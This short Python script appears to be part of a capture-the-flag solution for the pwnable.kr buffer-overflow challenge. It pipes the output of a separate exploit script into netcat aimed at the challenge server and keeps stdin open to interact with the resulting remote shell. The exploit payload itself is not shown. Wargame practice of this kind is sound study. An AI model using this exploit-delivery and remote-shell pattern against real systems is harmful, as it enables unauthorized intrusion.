import os

payload = "(python bof_1.py; cat) | nc pwnable.kr 9000"

os.system(payload)
